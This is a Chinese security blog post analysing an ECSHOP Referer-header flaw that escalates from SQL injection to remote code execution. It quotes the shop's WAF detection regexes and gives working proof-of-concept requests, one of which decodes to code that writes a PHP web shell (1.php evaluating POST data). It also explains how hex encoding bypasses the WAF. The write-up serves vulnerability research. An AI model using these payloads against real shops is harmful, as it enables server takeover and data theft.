<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="author" content="flight"><link rel="alternative" href="/atom.xml" title="技术改变世界，文化改变人心" type="application/atom+xml"><link rel="icon" href="/favicon.png"><title>ECSHOP 漏洞分析 - 技术改变世界，文化改变人心</title><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css"><!--[if lt IE 9]><script>(function(a,b){a="abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video".split(" ");for(b=a.length-1;b>=0;b--)document.createElement(a[b])})()</script><![endif]--><script src="/js/jquery-3.1.1.min.js"></script><script src="/js/fancybox/jquery.fancybox.min.js"></script></head><body style="opacity:0"><header class="head"><h1 class="head-title u-fl"><a href="/">技术改变世界，文化改变人心</a></h1><nav class="head-nav u-fr"><ul class="head-nav__list"><li class="head-nav__item"><a class="head-nav__link" href="/archives">カタログ/（目录）</a></li></ul></nav></header><main class="main"><article class="post"><header class="post__head"> <time class="post__time" datetime="2019-03-13T11:06:40.525Z">March 13, 2019</time><h1 class="post__title"><a href="/2019/03/13/ECSHOP 漏洞分析/">ECSHOP 漏洞分析</a></h1><div class="post__main echo"><h1 id="ECSHOP-漏洞分析"><a href="#ECSHOP-漏洞分析" class="headerlink" title="ECSHOP 漏洞分析"></a>ECSHOP 漏洞分析</h1><h2 id="全局过滤和防御"><a href="#全局过滤和防御" class="headerlink" title="全局过滤和防御"></a>全局过滤和防御</h2><p>ecshop的防御非常。。。。暴力，ecshop的结构并不是现在流行的MVC框架，它不是单入口模式的，所以有很多文件来表示对应的模块</p>
<p>全局过滤文件safe.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url_arr=<span class="keyword">array</span>(</span><br><span class="line"><span class="string">'xss'</span>=&gt;<span class="string">"\\=\\+\\/v(?:8|9|\\+|\\/)|\\%0acontent\\-(?:id|location|type|transfer\\-encoding)"</span>,</span><br><span class="line">);</span><br><span class="line">$args_arr=<span class="keyword">array</span>(</span><br><span class="line"><span class="string">'xss'</span>=&gt;<span class="string">"[\\'\\\"\\;\\*\\&lt;\\&gt;].*\\bon[a-zA-Z]&#123;3,15&#125;[\\s\\r\\n\\v\\f]*\\=|\\b(?:expression)\\(|\\&lt;script[\\s\\\\\\/]|\\b(?:eval|alert|prompt|msgbox)\\s*\\(|url\\((?:\\#|data|javascript)"</span>,</span><br><span class="line"><span class="string">'sql'</span>=&gt;<span class="string">"[^\\&#123;\\s]&#123;1&#125;(\\s|\\b)+(?:select\\b|update\\b|insert(?:(\\/\\*.*?\\*\\/)|(\\s)|(\\+))+into\\b).+?(?:from\\b|set\\b)|[^\\&#123;\\s]&#123;1&#125;(\\s|\\b)+(?:create|delete|drop|truncate|rename|desc)(?:(\\/\\*.*?\\*\\/)|(\\s)|(\\+))+(?:table\\b|from\\b|database\\b)|into(?:(\\/\\*.*?\\*\\/)|\\s|\\+)+(?:dump|out)file\\b|\\bsleep\\([\\s]*[\\d]+[\\s]*\\)|benchmark\\(([^\\,]*)\\,([^\\,]*)\\)|(?:declare|set|select)\\b.*@|union\\b.*(?:select|all)\\b|(?:select|update|insert|create|delete|drop|grant|truncate|rename|exec|desc|from|table|database|set|where)\\b.*(charset|ascii|bin|char|uncompress|concat|concat_ws|conv|export_set|hex|instr|left|load_file|locate|mid|sub|substring|oct|reverse|right|unhex)\\(|(?:master\\.\\.sysdatabases|msysaccessobjects|msysqueries|sysmodules|mysql\\.db|sys\\.database_name|information_schema\\.|sysobjects|sp_makewebtask|xp_cmdshell|sp_oamethod|sp_addextendedproc|sp_oacreate|xp_regread|sys\\.dbms_export_extension)"</span>,</span><br><span class="line"><span class="string">'other'</span>=&gt;<span class="string">"\\.\\.[\\\\\\/].*\\%00([^0-9a-fA-F]|$)|%00[\\'\\\"\\.]"</span>);</span><br><span class="line"><span class="keyword">if</span>( !function_exists(<span class="string">'filterData'</span>) )&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterData</span><span class="params">(&amp;$data,$type)</span></span>&#123;</span><br><span class="line">    $data <span class="keyword">and</span> filterArray($data,$type);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( !function_exists(<span class="string">'filterArray'</span>) )&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterArray</span><span class="params">(&amp;$data,$filterarr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">if</span>( is_array($value) )&#123;</span><br><span class="line">            filterArray($data[$key],$filterarr);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>( $key <span class="keyword">and</span> in_array(strtolower($key), <span class="keyword">array</span>(<span class="string">'goods_id'</span>,<span class="string">'product_id'</span>,<span class="string">'cat_id'</span>,<span class="string">'gid'</span>,<span class="string">'pid'</span>,<span class="string">'uid'</span>,<span class="string">'site_id'</span>)))&#123;</span><br><span class="line">                $value <span class="keyword">and</span> $data[$key] = intval($value);</span><br><span class="line">            &#125;<span class="keyword">elseif</span> ($key <span class="keyword">and</span> in_array(strtolower($key),<span class="keyword">array</span>(<span class="string">'order_num'</span>,<span class="string">'advance'</span>,<span class="string">'advance_freeze'</span>,<span class="string">'point_freeze'</span>,<span class="string">'point_history'</span>,<span class="string">'point'</span>,<span class="string">'score_rate'</span>,<span class="string">'state'</span>,<span class="string">'role_type'</span>,<span class="string">'advance_total'</span>,<span class="string">'advance_consume'</span>))) &#123;</span><br><span class="line">                <span class="keyword">unset</span>($data[$key]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// elseif( $key and in_array($key, array('tax_company','comment','contact','forward')) )&#123;</span></span><br><span class="line">            <span class="comment">//     $value and $data[$key] = htmltotxt($value);</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            <span class="keyword">elseif</span>( $value )&#123;</span><br><span class="line">                $data[$key] = filter($value,$filterarr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( !function_exists(<span class="string">'filter'</span>) )&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($str,$filterarr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($filterarr <span class="keyword">as</span> $value)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$value.<span class="string">"/is"</span>,$str)==<span class="number">1</span>||preg_match(<span class="string">"/"</span>.$value.<span class="string">"/is"</span>,urlencode($str))==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            header(<span class="string">"Content-type: text/html; charset=utf-8"</span>); </span><br><span class="line">            <span class="keyword">print</span> <span class="string">"您的提交带有不合法参数,谢谢合作"</span>;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$referer=<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_REFERER'</span>]) ? <span class="keyword">array</span>() : <span class="keyword">array</span>($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</span><br><span class="line">$query_string=<span class="keyword">empty</span>($_SERVER[<span class="string">"QUERY_STRING"</span>]) ? <span class="keyword">array</span>() : <span class="keyword">array</span>($_SERVER[<span class="string">"QUERY_STRING"</span>]);</span><br><span class="line"></span><br><span class="line">filterData($query_string,$url_arr);</span><br><span class="line">filterData($_GET,$args_arr);</span><br><span class="line">filterData($_POST,$args_arr);</span><br><span class="line">filterData($_COOKIE,$args_arr);</span><br><span class="line">filterData($referer,$args_arr);</span><br><span class="line">filterData($_SERVER,$args_arr);</span><br></pre></td></tr></table></figure>
<p>可以看到，ecshop把不符合安全规则的参数全部都进行了waf，直接不允许请求，而且对<code>$_GET,$_POST,$_COOKIE,$_SERVER</code>全部对进行了过滤，在这种暴力的防御下，我们的思路就应该从GET,POST这些变量中稍微变动一下，基本这种全局waf是很难饶过的，那么我们可以去找一些url二次编码，或者base64解码的地方，这样才可以绕过这种全局waf</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/user.php?act=login</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Referer</span>: 45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:"num";s:72:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -";s:2:"id";i:1;&#125;</span><br></pre></td></tr></table></figure>
<p>可以直接将poc提交，看一下结果</p>
<p><img src="http://120.77.152.169/upload/ee909a2e7501e285201311f7e767f2d7.png" alt=""></p>
<p>这里因为是mysql是5.7版本，而limit后procedure analyse的使用范围是：mysql5.x~5.6.6，所以procedure不能用，就不配了，但是漏洞已经可以显现了</p>
<h2 id="SQL注入漏洞跟踪分析"><a href="#SQL注入漏洞跟踪分析" class="headerlink" title="SQL注入漏洞跟踪分析"></a>SQL注入漏洞跟踪分析</h2><ol>
<li><p>第一步，程序获取了referer的值</p>
<p><img src="http://120.77.152.169/upload/bc86db4aa53f73f75ff367ba75b04884.png" alt=""></p>
<p>而我们的构造不会被safe.php所拦截，所以这一步获取的就是我们完全可控的referer</p>
</li>
<li><p>第二步，程序将referer传递给了注册模版变量的assgin函数</p>
<p><img src="http://120.77.152.169/upload/f37a7b7d3f563b42c3586abdb84e6630.png" alt=""></p>
<p>我们跟入assign函数：</p>
<p><img src="http://120.77.152.169/upload/f7152da097e01c59f12413070830f4bd.png" alt=""></p>
<p>因为我们传入的参数是字符串，进入else分支，因为这里没有任何的过滤，我们成功将我们可控的referer的值注册成为了cls_template类的变量</p>
</li>
<li><p>之后程序调用了display，我们跟入display函数</p>
<p><img src="http://120.77.152.169/upload/12c7d2baed6d5db6c06ec2d3db53a99a.png" alt=""></p>
<p>现在的filename为：<code>user_passport.dwt</code></p>
<ol>
<li><p>获取到了<code>user_passport.dwt</code>的内容存入<code>$out</code>变量中</p>
<p>referer的值被插入到了<code>$out</code>中</p>
<p><img src="http://120.77.152.169/upload/6a37932ac59d381149321130118c9801.png" alt=""></p>
</li>
<li><p>之后比较<code>$out</code>和<code>$this-&gt;_echash</code>如果相等的话就进入if的条件中，而<code>$this-&gt;_echash</code>的值在最前面就已经定义了</p>
<p><img src="http://120.77.152.169/upload/26736d00edf93f28d0f74fab6e62c8e7.png" alt=""></p>
</li>
<li><p>将获取到的<code>$out</code>根据<code>_echash</code>进行分割，我们可以看到被分割为了这样的数组</p>
<p><img src="http://120.77.152.169/upload/bdf99bbd5c53a3faaedf5d0baf4142e8.png" alt=""></p>
<p>因为是根据<code>_echash</code>进行分割的，所以我们需要referer的值中也有<code>_echash</code>的值，可以看到我们的payload现在变成了<code>ads|a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}</code></p>
</li>
<li><p>接下来将数组中奇数的部分作为参数调用<code>insert_mod</code>函数，跟入<code>insert_mod</code>函数</p>
<p><img src="http://120.77.152.169/upload/5cb326523367d4a0bebf81965aa629ac.png" alt=""></p>
</li>
<li><p>之后，将<code>$name</code>参数根据|进行分割，之后得到了<code>$fun</code>和<code>$para</code></p>
<p><img src="http://120.77.152.169/upload/0a85d231f1cdf7988f6b4fd6d67e0761.png" alt=""></p>
</li>
<li><p>现在我们可以控制执行的函数和参数，但是这个函数必须是<code>insert_xxx</code>这种类型的参数，而作者成功找到了<code>insert_ads</code>这个函数来作为漏洞的利用函数，跟入<code>insert_ads</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_ads</span><span class="params">($arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> $static_res = <span class="keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    $arr['num'] = intval($arr['num']);</span></span><br><span class="line"><span class="comment">//    $arr['id'] = intval($arr['id']);</span></span><br><span class="line">    $time = gmtime();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($arr[<span class="string">'num'</span>]) &amp;&amp; $arr[<span class="string">'num'</span>] != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $sql  = <span class="string">'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, '</span> .</span><br><span class="line">                    <span class="string">'p.ad_height, p.position_style, RAND() AS rnd '</span> .</span><br><span class="line">                <span class="string">'FROM '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad'</span>) . <span class="string">' AS a '</span>.</span><br><span class="line">                <span class="string">'LEFT JOIN '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad_position'</span>) . <span class="string">' AS p ON a.position_id = p.position_id '</span> .</span><br><span class="line">                <span class="string">"WHERE enabled = 1 AND start_time &lt;= '"</span> . $time . <span class="string">"' AND end_time &gt;= '"</span> . $time . <span class="string">"' "</span>.</span><br><span class="line">                    <span class="string">"AND a.position_id = '"</span> . $arr[<span class="string">'id'</span>] . <span class="string">"' "</span> .</span><br><span class="line">                <span class="string">'ORDER BY rnd LIMIT '</span> . $arr[<span class="string">'num'</span>];</span><br><span class="line">        $res = $GLOBALS[<span class="string">'db'</span>]-&gt;GetAll($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($static_res[$arr[<span class="string">'id'</span>]] === <span class="keyword">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $sql  = <span class="string">'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, '</span>.</span><br><span class="line">                        <span class="string">'p.ad_height, p.position_style, RAND() AS rnd '</span> .</span><br><span class="line">                    <span class="string">'FROM '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad'</span>) . <span class="string">' AS a '</span>.</span><br><span class="line">                    <span class="string">'LEFT JOIN '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad_position'</span>) . <span class="string">' AS p ON a.position_id = p.position_id '</span> .</span><br><span class="line">                    <span class="string">"WHERE enabled = 1 AND a.position_id = '"</span> . $arr[<span class="string">'id'</span>] .</span><br><span class="line">                        <span class="string">"' AND start_time &lt;= '"</span> . $time . <span class="string">"' AND end_time &gt;= '"</span> . $time . <span class="string">"' "</span> .</span><br><span class="line">                    <span class="string">'ORDER BY rnd LIMIT 1'</span>;</span><br><span class="line">            $static_res[$arr[<span class="string">'id'</span>]] = $GLOBALS[<span class="string">'db'</span>]-&gt;GetAll($sql);</span><br><span class="line">        &#125;</span><br><span class="line">        $res = $static_res[$arr[<span class="string">'id'</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">    $ads = <span class="keyword">array</span>();</span><br><span class="line">    $position_style = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>传入的参数<code>$arr</code>为：</p>
<p><img src="http://120.77.152.169/upload/0db5e3dce05802fb10a017fe74811e7a.png" alt=""></p>
<p>在SQL语句中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sql  = <span class="string">'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, '</span> .</span><br><span class="line">            <span class="string">'p.ad_height, p.position_style, RAND() AS rnd '</span> .</span><br><span class="line">        <span class="string">'FROM '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad'</span>) . <span class="string">' AS a '</span>.</span><br><span class="line">        <span class="string">'LEFT JOIN '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad_position'</span>) . <span class="string">' AS p ON a.position_id = p.position_id '</span> .</span><br><span class="line">        <span class="string">"WHERE enabled = 1 AND start_time &lt;= '"</span> . $time . <span class="string">"' AND end_time &gt;= '"</span> . $time . <span class="string">"' "</span>.</span><br><span class="line">            <span class="string">"AND a.position_id = '"</span> . $arr[<span class="string">'id'</span>] . <span class="string">"' "</span> .</span><br><span class="line">        <span class="string">'ORDER BY rnd LIMIT '</span> . $arr[<span class="string">'num'</span>];</span><br></pre></td></tr></table></figure>
<p>我们可以看到将<code>$arr[&#39;num&#39;]</code>的值直接拼接到了limit之后，在mysql允许procedure的时候就可以造成SQL注入</p>
</li>
</ol>
</li>
</ol>
<h2 id="GETSHELL漏洞分析"><a href="#GETSHELL漏洞分析" class="headerlink" title="GETSHELL漏洞分析"></a>GETSHELL漏洞分析</h2><p>很多人认为到这里，SQL注入就是这个漏洞所能做到的一切了，但是，根据POC，这个漏洞从一个XSS到SQL注入，最终GETSHELL，我们现在分析GETSHELL的payload</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/user.php?act=login</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Referer</span>: 45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";&#125;</span><br></pre></td></tr></table></figure>
<p>其中十六进制转为字符串之后的结果为：</p>
<p><code>&#39;/*</code></p>
<p><code>{$asd&#39;];assert(base64_decode(&#39;ZmlsZV9wdXRfY29udGVudHMoJzEucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTMzN10pOyA/Picp&#39;));//}xxx</code></p>
<p>因为mysql对十六进制进行转为字符处理，所以我们的payload用十六进制转换后即可成功绕过ecshop的全局waf</p>
<p>在执行到<code>insert_ads</code>方法之后，查看SQL语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, <span class="keyword">RAND</span>() <span class="keyword">AS</span> rnd <span class="keyword">FROM</span> <span class="string">`ecshop`</span>.<span class="string">`ecs_ad`</span> <span class="keyword">AS</span> a <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> <span class="string">`ecshop`</span>.<span class="string">`ecs_ad_position`</span> <span class="keyword">AS</span> p <span class="keyword">ON</span> a.position_id = p.position_id <span class="keyword">WHERE</span> enabled = <span class="number">1</span> <span class="keyword">AND</span> start_time &lt;= <span class="string">'1552473239'</span> <span class="keyword">AND</span> end_time &gt;= <span class="string">'1552473239'</span> <span class="keyword">AND</span> a.position_id = <span class="string">''</span><span class="comment">/*' ORDER BY rnd LIMIT */</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">0x272f2a</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878</span>,<span class="number">10</span><span class="comment">-- -</span></span><br></pre></td></tr></table></figure>
<p>可以看到，我们成功进行了union查询，最终，我们查询的<code>$res[&#39;position_style&#39;]</code>结果为：</p>
<p><img src="http://120.77.152.169/upload/041621f8bae51d8eac7d8c6008748346.png" alt=""></p>
<p>当满足<code>$row[&#39;position_id&#39;] != $arr[&#39;id&#39;]</code>的时候，<code>$position_style = $row[&#39;position_style&#39;];</code>被赋值为我们的payload，之后<code>$position_style</code>在拼接str:之后直接被带入fetch函数</p>
<p><img src="http://120.77.152.169/upload/8d87b66f102beb1e25dc271571678d2b.png" alt=""></p>
<p>跟入fetch函数</p>
<p><img src="http://120.77.152.169/upload/48f8c2c64da4ba135b9c9f9fdbda408b.png" alt=""></p>
<p>可以看到，我们的payload被未经处理的带入了<code>fetch_str</code>，看一下<code>fetch_str</code>进行了什么处理：</p>
<p><img src="http://120.77.152.169/upload/706d10fa0c9fe3554286c9efd810cda1.png" alt=""></p>
<ol>
<li><p>将<code>$source</code>里面包含的<code>copy|fputs|fopen|file_put_contents|fwrite|eval|phpinfo</code>替换为空，但是很显然忘记了assert（注意：在php7以上，assert不再能执行函数））</p>
</li>
<li><p>之后包含了<code>includes_cls_template_fetch_str.php</code>文件，代码很短，但是是我们执行命令的重要的一步</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$template = <span class="keyword">$this</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace_callback(<span class="string">"/&#123;([^\&#125;\&#123;\n]*)&#125;/"</span>, <span class="function"><span class="keyword">function</span><span class="params">($r)</span> <span class="title">use</span><span class="params">(&amp;$template)</span></span>&#123;<span class="keyword">return</span> $template-&gt;select($r[<span class="number">1</span>]);&#125;, $source);</span><br></pre></td></tr></table></figure>
<p><code>preg_replace_callback</code>函数将<code>{}</code>之间的内容作为参数传给了select函数，进入select函数</p>
<p><img src="http://120.77.152.169/upload/dcfc7bea34c05c32c65d20a253896c17.png" alt=""></p>
<p>在第三个条件分支满足条件，值的第一个字符为：\$，将<code>$tag</code>的值拼接在<code>&lt;?php xxxx ?&gt;</code>之间，返回结果，返回的字符串为：</p>
<p><img src="http://120.77.152.169/upload/9a8a1a2009ef49f3c791a129ccede370.png" alt=""></p>
<p>之后进入到<code>_eval</code>函数</p>
<p><img src="http://120.77.152.169/upload/5ec3c7a107bc9628045c31ecf7dc09be.png" alt=""></p>
<p>可以看到我们的代码进入了eval执行，最后成功getshell，可以在根目录下发现1.php</p>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>   原本一个简单的XSS点，之后到有mysql版本限制的SQL注入，再到无任何限制的getshell，简直不要太强。。。。</p>
</div></header><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a class="post__tag__link" href="/tags/漏洞分析/">漏洞分析</a></li><li class="post__tag__item"><a class="post__tag__link" href="/tags/安全技术/">安全技术</a></li></ul></footer></article><div class="comments" id="lv-container" data-id="city" data-uid="your uid"><script>(function(d, s) {var j, e = d.getElementsByTagName(s)[0];if (typeof LivereTower === 'function') { return; } j = d.createElement(s);j.src = 'https://cdn-city.livere.com/js/embed.dist.js';j.async = true;e.parentNode.insertBefore(j, e);})(document, 'script');</script></div></main><footer class="foot"><div class="foot-copy">&copy; 2016-2019 flight</div></footer><script src="/js/scroller.js"></script><script src="/js/main.js"></script></body></html>